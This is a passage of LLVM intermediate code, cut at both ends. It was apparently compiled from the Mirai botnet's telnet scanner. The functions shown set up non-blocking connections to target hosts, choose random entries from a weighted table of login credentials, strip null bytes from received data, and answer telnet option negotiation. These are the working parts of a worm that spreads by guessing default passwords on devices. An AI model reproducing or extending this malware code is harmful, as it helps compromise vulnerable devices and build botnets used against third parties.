declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @setup_connection(%struct.scanner_connection* nocapture) unnamed_addr #3 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = bitcast %struct.sockaddr_in* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 16, i32 4, i1 false)
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 2
  %5 = load i32, i32* %4, align 8
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %1
  %8 = tail call i32 @close(i32 %5) #9
  store i32 -1, i32* %4, align 8
  br label %9

; <label>:9:                                      ; preds = %1, %7
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %10, i32* %4, align 8
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %31, label %12

; <label>:12:                                     ; preds = %9
  %13 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  store i32 0, i32* %13, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  tail call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 8192, i32 4, i1 false)
  %15 = tail call i32 (i32, i32, ...) @fcntl(i32 %10, i32 3, i32 0) #9
  %16 = or i32 %15, 2048
  %17 = tail call i32 (i32, i32, ...) @fcntl(i32 %10, i32 4, i32 %16) #9
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 15
  %20 = load i32, i32* %19, align 4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  store i32 %20, i32* %21, align 4
  %22 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 13
  %23 = load i16, i16* %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* @fake_time, align 4
  %26 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 3
  store i32 %25, i32* %26, align 4
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 16
  store i32 1, i32* %27, align 8
  %28 = load i32, i32* %4, align 8
  %29 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %30 = call i32 @connect(i32 %28, %struct.sockaddr* nonnull %29, i32 16) #9
  br label %31

; <label>:31:                                     ; preds = %9, %12
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @fdclose(%struct.scanner_connection* nocapture, i32) local_unnamed_addr #3 {
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 8, i64 0
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1, i32 0
  store i32 0, i32* %4, align 8
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 12
  store i8 0, i8* %5, align 1
  %6 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1, i32 1
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 17, i32 4, i1 false)
  store i32 -1, i32* %6, align 4
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 5
  store i32 0, i32* %7, align 4
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  store i32 0, i32* %8, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 2
  %10 = load i32, i32* %9, align 8
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %14, label %12

; <label>:12:                                     ; preds = %2
  %13 = tail call i32 @close(i32 %10) #9
  br label %14

; <label>:14:                                     ; preds = %2, %12
  store i32 -1, i32* %9, align 8
  %15 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 16
  store i32 0, i32* %15, align 8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc %struct.scanner_auth* @random_auth_entry() unnamed_addr #3 {
  %1 = tail call i32 @rand_next() #9
  %2 = load i16, i16* @auth_table_max_weight, align 2
  %3 = zext i16 %2 to i32
  %4 = urem i32 %1, %3
  %5 = load i32, i32* @auth_table_len, align 4
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %0
  %7 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %8 = sext i32 %5 to i64
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %19
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %19 ]
  %10 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %7, i64 %indvars.iv, i32 2
  %11 = load i16, i16* %10, align 8
  %12 = zext i16 %11 to i32
  %13 = icmp ult i32 %4, %12
  br i1 %13, label %19, label %14

; <label>:14:                                     ; preds = %9
  %15 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %7, i64 %indvars.iv, i32 3
  %16 = load i16, i16* %15, align 2
  %17 = zext i16 %16 to i32
  %18 = icmp ult i32 %4, %17
  br i1 %18, label %._crit_edge9, label %19

; <label>:19:                                     ; preds = %14, %9
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %20 = icmp slt i64 %indvars.iv.next, %8
  br i1 %20, label %9, label %._crit_edge.loopexit

._crit_edge9:                                     ; preds = %14
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %7, i64 %indvars.iv
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %19
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %._crit_edge9, %0
  %.0 = phi %struct.scanner_auth* [ %21, %._crit_edge9 ], [ null, %0 ], [ null, %._crit_edge.loopexit ]
  ret %struct.scanner_auth* %.0
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) local_unnamed_addr #3 {
  %5 = sext i32 %2 to i64
  %6 = tail call i64 @recv(i32 %0, i8* %1, i64 %5, i32 %3) #9
  %7 = trunc i64 %6 to i32
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = and i64 %6, 4294967295
  %min.iters.check = icmp ult i64 %wide.trip.count, 32
  br i1 %min.iters.check, label %.lr.ph.preheader77, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %n.mod.vf = and i64 %6, 31
  %n.vec = sub nsw i64 %wide.trip.count, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.lr.ph.preheader77, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %pred.store.continue76
  %index = phi i64 [ %index.next, %pred.store.continue76 ], [ 0, %vector.body.preheader ]
  %9 = getelementptr inbounds i8, i8* %1, i64 %index
  %10 = bitcast i8* %9 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %10, align 1
  %11 = getelementptr i8, i8* %9, i64 16
  %12 = bitcast i8* %11 to <16 x i8>*
  %wide.load14 = load <16 x i8>, <16 x i8>* %12, align 1
  %13 = icmp eq <16 x i8> %wide.load, zeroinitializer
  %14 = icmp eq <16 x i8> %wide.load14, zeroinitializer
  %15 = extractelement <16 x i1> %13, i32 0
  br i1 %15, label %pred.store.if, label %pred.store.continue

pred.store.if:                                    ; preds = %vector.body
  %16 = getelementptr inbounds i8, i8* %1, i64 %index
  store i8 65, i8* %16, align 1
  br label %pred.store.continue

pred.store.continue:                              ; preds = %pred.store.if, %vector.body
  %17 = extractelement <16 x i1> %13, i32 1
  br i1 %17, label %pred.store.if15, label %pred.store.continue16

pred.store.if15:                                  ; preds = %pred.store.continue
  %18 = or i64 %index, 1
  %19 = getelementptr inbounds i8, i8* %1, i64 %18
  store i8 65, i8* %19, align 1
  br label %pred.store.continue16

pred.store.continue16:                            ; preds = %pred.store.if15, %pred.store.continue
  %20 = extractelement <16 x i1> %13, i32 2
  br i1 %20, label %pred.store.if17, label %pred.store.continue18

pred.store.if17:                                  ; preds = %pred.store.continue16
  %21 = or i64 %index, 2
  %22 = getelementptr inbounds i8, i8* %1, i64 %21
  store i8 65, i8* %22, align 1
  br label %pred.store.continue18

pred.store.continue18:                            ; preds = %pred.store.if17, %pred.store.continue16
  %23 = extractelement <16 x i1> %13, i32 3
  br i1 %23, label %pred.store.if19, label %pred.store.continue20

pred.store.if19:                                  ; preds = %pred.store.continue18
  %24 = or i64 %index, 3
  %25 = getelementptr inbounds i8, i8* %1, i64 %24
  store i8 65, i8* %25, align 1
  br label %pred.store.continue20

pred.store.continue20:                            ; preds = %pred.store.if19, %pred.store.continue18
  %26 = extractelement <16 x i1> %13, i32 4
  br i1 %26, label %pred.store.if21, label %pred.store.continue22

pred.store.if21:                                  ; preds = %pred.store.continue20
  %27 = or i64 %index, 4
  %28 = getelementptr inbounds i8, i8* %1, i64 %27
  store i8 65, i8* %28, align 1
  br label %pred.store.continue22

pred.store.continue22:                            ; preds = %pred.store.if21, %pred.store.continue20
  %29 = extractelement <16 x i1> %13, i32 5
  br i1 %29, label %pred.store.if23, label %pred.store.continue24

pred.store.if23:                                  ; preds = %pred.store.continue22
  %30 = or i64 %index, 5
  %31 = getelementptr inbounds i8, i8* %1, i64 %30
  store i8 65, i8* %31, align 1
  br label %pred.store.continue24

pred.store.continue24:                            ; preds = %pred.store.if23, %pred.store.continue22
  %32 = extractelement <16 x i1> %13, i32 6
  br i1 %32, label %pred.store.if25, label %pred.store.continue26

pred.store.if25:                                  ; preds = %pred.store.continue24
  %33 = or i64 %index, 6
  %34 = getelementptr inbounds i8, i8* %1, i64 %33
  store i8 65, i8* %34, align 1
  br label %pred.store.continue26

pred.store.continue26:                            ; preds = %pred.store.if25, %pred.store.continue24
  %35 = extractelement <16 x i1> %13, i32 7
  br i1 %35, label %pred.store.if27, label %pred.store.continue28

pred.store.if27:                                  ; preds = %pred.store.continue26
  %36 = or i64 %index, 7
  %37 = getelementptr inbounds i8, i8* %1, i64 %36
  store i8 65, i8* %37, align 1
  br label %pred.store.continue28

pred.store.continue28:                            ; preds = %pred.store.if27, %pred.store.continue26
  %38 = extractelement <16 x i1> %13, i32 8
  br i1 %38, label %pred.store.if29, label %pred.store.continue30

pred.store.if29:                                  ; preds = %pred.store.continue28
  %39 = or i64 %index, 8
  %40 = getelementptr inbounds i8, i8* %1, i64 %39
  store i8 65, i8* %40, align 1
  br label %pred.store.continue30

pred.store.continue30:                            ; preds = %pred.store.if29, %pred.store.continue28
  %41 = extractelement <16 x i1> %13, i32 9
  br i1 %41, label %pred.store.if31, label %pred.store.continue32

pred.store.if31:                                  ; preds = %pred.store.continue30
  %42 = or i64 %index, 9
  %43 = getelementptr inbounds i8, i8* %1, i64 %42
  store i8 65, i8* %43, align 1
  br label %pred.store.continue32

pred.store.continue32:                            ; preds = %pred.store.if31, %pred.store.continue30
  %44 = extractelement <16 x i1> %13, i32 10
  br i1 %44, label %pred.store.if33, label %pred.store.continue34

pred.store.if33:                                  ; preds = %pred.store.continue32
  %45 = or i64 %index, 10
  %46 = getelementptr inbounds i8, i8* %1, i64 %45
  store i8 65, i8* %46, align 1
  br label %pred.store.continue34

pred.store.continue34:                            ; preds = %pred.store.if33, %pred.store.continue32
  %47 = extractelement <16 x i1> %13, i32 11
  br i1 %47, label %pred.store.if35, label %pred.store.continue36

pred.store.if35:                                  ; preds = %pred.store.continue34
  %48 = or i64 %index, 11
  %49 = getelementptr inbounds i8, i8* %1, i64 %48
  store i8 65, i8* %49, align 1
  br label %pred.store.continue36

pred.store.continue36:                            ; preds = %pred.store.if35, %pred.store.continue34
  %50 = extractelement <16 x i1> %13, i32 12
  br i1 %50, label %pred.store.if37, label %pred.store.continue38

pred.store.if37:                                  ; preds = %pred.store.continue36
  %51 = or i64 %index, 12
  %52 = getelementptr inbounds i8, i8* %1, i64 %51
  store i8 65, i8* %52, align 1
  br label %pred.store.continue38

pred.store.continue38:                            ; preds = %pred.store.if37, %pred.store.continue36
  %53 = extractelement <16 x i1> %13, i32 13
  br i1 %53, label %pred.store.if39, label %pred.store.continue40

pred.store.if39:                                  ; preds = %pred.store.continue38
  %54 = or i64 %index, 13
  %55 = getelementptr inbounds i8, i8* %1, i64 %54
  store i8 65, i8* %55, align 1
  br label %pred.store.continue40

pred.store.continue40:                            ; preds = %pred.store.if39, %pred.store.continue38
  %56 = extractelement <16 x i1> %13, i32 14
  br i1 %56, label %pred.store.if41, label %pred.store.continue42

pred.store.if41:                                  ; preds = %pred.store.continue40
  %57 = or i64 %index, 14
  %58 = getelementptr inbounds i8, i8* %1, i64 %57
  store i8 65, i8* %58, align 1
  br label %pred.store.continue42

pred.store.continue42:                            ; preds = %pred.store.if41, %pred.store.continue40
  %59 = extractelement <16 x i1> %13, i32 15
  br i1 %59, label %pred.store.if43, label %pred.store.continue44

pred.store.if43:                                  ; preds = %pred.store.continue42
  %60 = or i64 %index, 15
  %61 = getelementptr inbounds i8, i8* %1, i64 %60
  store i8 65, i8* %61, align 1
  br label %pred.store.continue44

pred.store.continue44:                            ; preds = %pred.store.if43, %pred.store.continue42
  %62 = extractelement <16 x i1> %14, i32 0
  br i1 %62, label %pred.store.if45, label %pred.store.continue46

pred.store.if45:                                  ; preds = %pred.store.continue44
  %63 = or i64 %index, 16
  %64 = getelementptr inbounds i8, i8* %1, i64 %63
  store i8 65, i8* %64, align 1
  br label %pred.store.continue46

pred.store.continue46:                            ; preds = %pred.store.if45, %pred.store.continue44
  %65 = extractelement <16 x i1> %14, i32 1
  br i1 %65, label %pred.store.if47, label %pred.store.continue48

pred.store.if47:                                  ; preds = %pred.store.continue46
  %66 = or i64 %index, 17
  %67 = getelementptr inbounds i8, i8* %1, i64 %66
  store i8 65, i8* %67, align 1
  br label %pred.store.continue48

pred.store.continue48:                            ; preds = %pred.store.if47, %pred.store.continue46
  %68 = extractelement <16 x i1> %14, i32 2
  br i1 %68, label %pred.store.if49, label %pred.store.continue50

pred.store.if49:                                  ; preds = %pred.store.continue48
  %69 = or i64 %index, 18
  %70 = getelementptr inbounds i8, i8* %1, i64 %69
  store i8 65, i8* %70, align 1
  br label %pred.store.continue50

pred.store.continue50:                            ; preds = %pred.store.if49, %pred.store.continue48
  %71 = extractelement <16 x i1> %14, i32 3
  br i1 %71, label %pred.store.if51, label %pred.store.continue52

pred.store.if51:                                  ; preds = %pred.store.continue50
  %72 = or i64 %index, 19
  %73 = getelementptr inbounds i8, i8* %1, i64 %72
  store i8 65, i8* %73, align 1
  br label %pred.store.continue52

pred.store.continue52:                            ; preds = %pred.store.if51, %pred.store.continue50
  %74 = extractelement <16 x i1> %14, i32 4
  br i1 %74, label %pred.store.if53, label %pred.store.continue54

pred.store.if53:                                  ; preds = %pred.store.continue52
  %75 = or i64 %index, 20
  %76 = getelementptr inbounds i8, i8* %1, i64 %75
  store i8 65, i8* %76, align 1
  br label %pred.store.continue54

pred.store.continue54:                            ; preds = %pred.store.if53, %pred.store.continue52
  %77 = extractelement <16 x i1> %14, i32 5
  br i1 %77, label %pred.store.if55, label %pred.store.continue56

pred.store.if55:                                  ; preds = %pred.store.continue54
  %78 = or i64 %index, 21
  %79 = getelementptr inbounds i8, i8* %1, i64 %78
  store i8 65, i8* %79, align 1
  br label %pred.store.continue56

pred.store.continue56:                            ; preds = %pred.store.if55, %pred.store.continue54
  %80 = extractelement <16 x i1> %14, i32 6
  br i1 %80, label %pred.store.if57, label %pred.store.continue58

pred.store.if57:                                  ; preds = %pred.store.continue56
  %81 = or i64 %index, 22
  %82 = getelementptr inbounds i8, i8* %1, i64 %81
  store i8 65, i8* %82, align 1
  br label %pred.store.continue58

pred.store.continue58:                            ; preds = %pred.store.if57, %pred.store.continue56
  %83 = extractelement <16 x i1> %14, i32 7
  br i1 %83, label %pred.store.if59, label %pred.store.continue60

pred.store.if59:                                  ; preds = %pred.store.continue58
  %84 = or i64 %index, 23
  %85 = getelementptr inbounds i8, i8* %1, i64 %84
  store i8 65, i8* %85, align 1
  br label %pred.store.continue60

pred.store.continue60:                            ; preds = %pred.store.if59, %pred.store.continue58
  %86 = extractelement <16 x i1> %14, i32 8
  br i1 %86, label %pred.store.if61, label %pred.store.continue62

pred.store.if61:                                  ; preds = %pred.store.continue60
  %87 = or i64 %index, 24
  %88 = getelementptr inbounds i8, i8* %1, i64 %87
  store i8 65, i8* %88, align 1
  br label %pred.store.continue62

pred.store.continue62:                            ; preds = %pred.store.if61, %pred.store.continue60
  %89 = extractelement <16 x i1> %14, i32 9
  br i1 %89, label %pred.store.if63, label %pred.store.continue64

pred.store.if63:                                  ; preds = %pred.store.continue62
  %90 = or i64 %index, 25
  %91 = getelementptr inbounds i8, i8* %1, i64 %90
  store i8 65, i8* %91, align 1
  br label %pred.store.continue64

pred.store.continue64:                            ; preds = %pred.store.if63, %pred.store.continue62
  %92 = extractelement <16 x i1> %14, i32 10
  br i1 %92, label %pred.store.if65, label %pred.store.continue66

pred.store.if65:                                  ; preds = %pred.store.continue64
  %93 = or i64 %index, 26
  %94 = getelementptr inbounds i8, i8* %1, i64 %93
  store i8 65, i8* %94, align 1
  br label %pred.store.continue66

pred.store.continue66:                            ; preds = %pred.store.if65, %pred.store.continue64
  %95 = extractelement <16 x i1> %14, i32 11
  br i1 %95, label %pred.store.if67, label %pred.store.continue68

pred.store.if67:                                  ; preds = %pred.store.continue66
  %96 = or i64 %index, 27
  %97 = getelementptr inbounds i8, i8* %1, i64 %96
  store i8 65, i8* %97, align 1
  br label %pred.store.continue68

pred.store.continue68:                            ; preds = %pred.store.if67, %pred.store.continue66
  %98 = extractelement <16 x i1> %14, i32 12
  br i1 %98, label %pred.store.if69, label %pred.store.continue70

pred.store.if69:                                  ; preds = %pred.store.continue68
  %99 = or i64 %index, 28
  %100 = getelementptr inbounds i8, i8* %1, i64 %99
  store i8 65, i8* %100, align 1
  br label %pred.store.continue70

pred.store.continue70:                            ; preds = %pred.store.if69, %pred.store.continue68
  %101 = extractelement <16 x i1> %14, i32 13
  br i1 %101, label %pred.store.if71, label %pred.store.continue72

pred.store.if71:                                  ; preds = %pred.store.continue70
  %102 = or i64 %index, 29
  %103 = getelementptr inbounds i8, i8* %1, i64 %102
  store i8 65, i8* %103, align 1
  br label %pred.store.continue72

pred.store.continue72:                            ; preds = %pred.store.if71, %pred.store.continue70
  %104 = extractelement <16 x i1> %14, i32 14
  br i1 %104, label %pred.store.if73, label %pred.store.continue74

pred.store.if73:                                  ; preds = %pred.store.continue72
  %105 = or i64 %index, 30
  %106 = getelementptr inbounds i8, i8* %1, i64 %105
  store i8 65, i8* %106, align 1
  br label %pred.store.continue74

pred.store.continue74:                            ; preds = %pred.store.if73, %pred.store.continue72
  %107 = extractelement <16 x i1> %14, i32 15
  br i1 %107, label %pred.store.if75, label %pred.store.continue76

pred.store.if75:                                  ; preds = %pred.store.continue74
  %108 = or i64 %index, 31
  %109 = getelementptr inbounds i8, i8* %1, i64 %108
  store i8 65, i8* %109, align 1
  br label %pred.store.continue76

pred.store.continue76:                            ; preds = %pred.store.if75, %pred.store.continue74
  %index.next = add i64 %index, 32
  %110 = icmp eq i64 %index.next, %n.vec
  br i1 %110, label %middle.block, label %vector.body, !llvm.loop !5

middle.block:                                     ; preds = %pred.store.continue76
  %cmp.n = icmp eq i64 %n.mod.vf, 0
  br i1 %cmp.n, label %.loopexit, label %.lr.ph.preheader77

.lr.ph.preheader77:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
  %indvars.iv.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %n.vec, %middle.block ]
  %111 = sub i64 %6, %indvars.iv.ph
  %112 = add nsw i64 %wide.trip.count, -1
  %113 = sub nsw i64 %112, %indvars.iv.ph
  %xtraiter = and i64 %111, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader77
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %118, %.lr.ph.prol.preheader
  %indvars.iv.prol = phi i64 [ %indvars.iv.next.prol, %118 ], [ %indvars.iv.ph, %.lr.ph.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %118 ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %114 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.prol
  %115 = load i8, i8* %114, align 1
  %116 = icmp eq i8 %115, 0
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %.lr.ph.prol
  store i8 65, i8* %114, align 1
  br label %118

; <label>:118:                                    ; preds = %117, %.lr.ph.prol
  %indvars.iv.next.prol = add nuw nsw i64 %indvars.iv.prol, 1
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !8

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %118
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader77, %.lr.ph.prol.loopexit.unr-lcssa
  %indvars.iv.unr = phi i64 [ %indvars.iv.ph, %.lr.ph.preheader77 ], [ %indvars.iv.next.prol, %.lr.ph.prol.loopexit.unr-lcssa ]
  %119 = icmp ult i64 %113, 3
  br i1 %119, label %.loopexit.loopexit, label %.lr.ph.preheader77.new

.lr.ph.preheader77.new:                           ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %136, %.lr.ph.preheader77.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph.preheader77.new ], [ %indvars.iv.next.3, %136 ]
  %120 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv
  %121 = load i8, i8* %120, align 1
  %122 = icmp eq i8 %121, 0
  br i1 %122, label %123, label %.lr.ph.178

; <label>:123:                                    ; preds = %.lr.ph
  store i8 65, i8* %120, align 1
  br label %.lr.ph.178

.lr.ph.178:                                       ; preds = %.lr.ph, %123
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %124 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next
  %125 = load i8, i8* %124, align 1
  %126 = icmp eq i8 %125, 0
  br i1 %126, label %127, label %.lr.ph.279

.loopexit.loopexit.unr-lcssa:                     ; preds = %136
  br label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph.prol.loopexit, %.loopexit.loopexit.unr-lcssa
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %middle.block, %4
  ret i32 %7

; <label>:127:                                    ; preds = %.lr.ph.178
  store i8 65, i8* %124, align 1
  br label %.lr.ph.279

.lr.ph.279:                                       ; preds = %127, %.lr.ph.178
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %128 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.1
  %129 = load i8, i8* %128, align 1
  %130 = icmp eq i8 %129, 0
  br i1 %130, label %131, label %.lr.ph.380

; <label>:131:                                    ; preds = %.lr.ph.279
  store i8 65, i8* %128, align 1
  br label %.lr.ph.380

.lr.ph.380:                                       ; preds = %131, %.lr.ph.279
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %132 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.2
  %133 = load i8, i8* %132, align 1
  %134 = icmp eq i8 %133, 0
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %.lr.ph.380
  store i8 65, i8* %132, align 1
  br label %136

; <label>:136:                                    ; preds = %135, %.lr.ph.380
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %exitcond.3 = icmp eq i64 %indvars.iv.next.3, %wide.trip.count
  br i1 %exitcond.3, label %.loopexit.loopexit.unr-lcssa, label %.lr.ph, !llvm.loop !10
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_iacs(%struct.scanner_connection*) unnamed_addr #3 {
  %2 = alloca [3 x i8], align 1
  %3 = alloca [9 x i8], align 1
  %4 = getelementptr inbounds [3 x i8], [3 x i8]* %2, i64 0, i64 0
  %5 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %6 = load i32, i32* %5, align 8
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %1
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 2
  %10 = getelementptr inbounds [9 x i8], [9 x i8]* %3, i64 0, i64 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %.backedge
  %.03135 = phi i8* [ %8, %.lr.ph ], [ %.031.be, %.backedge ]
  %.03234 = phi i32 [ 0, %.lr.ph ], [ %.032.be, %.backedge ]
  %12 = load i8, i8* %.03135, align 1
  %13 = icmp eq i8 %12, -1
  br i1 %13, label %14, label %._crit_edge.loopexit

; <label>:14:                                     ; preds = %11
  %15 = call fastcc signext i8 @can_consume(%struct.scanner_connection* nonnull %0, i8* nonnull %.03135, i32 1)
  %16 = icmp eq i8 %15, 0
  br i1 %16, label %._crit_edge.loopexit, label %17

; <label>:17:                                     ; preds = %14
  %18 = getelementptr inbounds i8, i8* %.03135, i64 1
  %19 = load i8, i8* %18, align 1
  switch i8 %19, label %39 [
    i8 -1, label %20
    i8 -3, label %25
  ]

; <label>:20:                                     ; preds = %17
  %21 = getelementptr inbounds i8, i8* %.03135, i64 2
  %22 = add nsw i32 %.03234, 2
  br label %.backedge

.backedge:                                        ; preds = %20, %32, %49
  %.032.be = phi i32 [ %22, %20 ], [ %53, %49 ], [ %34, %32 ]
  %.031.be = phi i8* [ %21, %20 ], [ %52, %49 ], [ %33, %32 ]
  %23 = load i32, i32* %5, align 8
  %24 = icmp slt i32 %.032.be, %23
  br i1 %24, label %11, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %17
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %4, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i64 0, i64 0), i64 3, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %10, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i64 0, i64 0), i64 9, i32 1, i1 false)
  %26 = call fastcc signext i8 @can_consume(%struct.scanner_connection* nonnull %0, i8* nonnull %.03135, i32 2)
  %27 = icmp eq i8 %26, 0
  br i1 %27, label %._crit_edge.loopexit, label %28

; <label>:28:                                     ; preds = %25
  %29 = getelementptr inbounds i8, i8* %.03135, i64 2
  %30 = load i8, i8* %29, align 1
  %31 = icmp eq i8 %30, 31
  br i1 %31, label %32, label %39

; <label>:32:                                     ; preds = %28
  %33 = getelementptr inbounds i8, i8* %.03135, i64 3
  %34 = add nsw i32 %.03234, 3
  %35 = load i32, i32* %9, align 8
  %36 = call i64 @send(i32 %35, i8* nonnull %4, i64 3, i32 16384) #9
  %37 = load i32, i32* %9, align 8
  %38 = call i64 @send(i32 %37, i8* nonnull %10, i64 9, i32 16384) #9
  br label %.backedge

; <label>:39:                                     ; preds = %17, %28
  %40 = call fastcc signext i8 @can_consume(%struct.scanner_connection* %0, i8* nonnull %.03135, i32 2)
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %._crit_edge.loopexit, label %.preheader.preheader

.preheader.preheader:                             ; preds = %39
  %42 = load i8, i8* %.03135, align 1
  switch i8 %42, label %.preheader.144 [
    i8 -3, label %43
    i8 -5, label %.sink.split
  ]

; <label>:43:                                     ; preds = %.preheader.preheader
  br label %.sink.split

.sink.split:                                      ; preds = %.preheader.preheader, %43
  %.sink = phi i8 [ -4, %43 ], [ -3, %.preheader.preheader ]
  store i8 %.sink, i8* %.03135, align 1
  br label %.preheader.144

.preheader.144:                                   ; preds = %.preheader.preheader, %.sink.split
  %44 = load i8, i8* %18, align 1
  switch i8 %44, label %.preheader.245 [
    i8 -3, label %45
    i8 -5, label %.sink.split.1
  ]

._crit_edge.loopexit:                             ; preds = %25, %39, %14, %11, %.backedge
  %.032.lcssa.ph = phi i32 [ %.03234, %25 ], [ %.03234, %39 ], [ %.03234, %14 ], [ %.03234, %11 ], [ %.032.be, %.backedge ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.032.lcssa = phi i32 [ 0, %1 ], [ %.032.lcssa.ph, %._crit_edge.loopexit ]
  ret i32 %.032.lcssa

; <label>:45:                                     ; preds = %.preheader.144
  br label %.sink.split.1

.sink.split.1:                                    ; preds = %45, %.preheader.144
  %.sink.1 = phi i8 [ -4, %45 ], [ -3, %.preheader.144 ]
